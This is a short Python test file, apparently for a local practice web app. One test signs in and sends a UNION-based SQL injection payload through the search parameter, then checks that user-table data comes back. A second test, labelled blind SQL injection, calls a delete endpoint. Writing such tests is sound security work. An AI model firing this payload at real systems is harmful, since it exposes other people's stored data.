import requests

def test_1_sql_injection():
    params = {'username':'new', 'password':'new'}
    page = requests.get('https://localhost/python/signin.py', params=params, verify=False)
    page.encoding = 'utf-8'
    cookiename = page.text.strip().split(';')[0].split('=')[0]
    cookievalue = page.text.strip().split(';')[0].split('=')[1]
    cookies = {cookiename: cookievalue}
    params = {'search':'1" UNION Select * From `User+Store` #'}
    page = requests.get('https://localhost/python/search.py', params=params, cookies=cookies, verify=False)
    assert 'User: new Title: new' in page.text


def test_2_blind_sql_injection():
    params = {'username':'new', 'password':'new'}
    page = requests.get('https://localhost/python/signin.py', params=params, verify=False)
    page.encoding = 'utf-8'
    cookiename = page.text.strip().split(';')[0].split('=')[0]
    cookievalue = page.text.strip().split(';')[0].split('=')[1]
    cookies = {cookiename: cookievalue}
    params = {'video':'fail'}
    page = requests.get('https://localhost/python/delete.py', params=params, cookies=cookies, verify=False)
    assert '/html/manage.html' in page.text
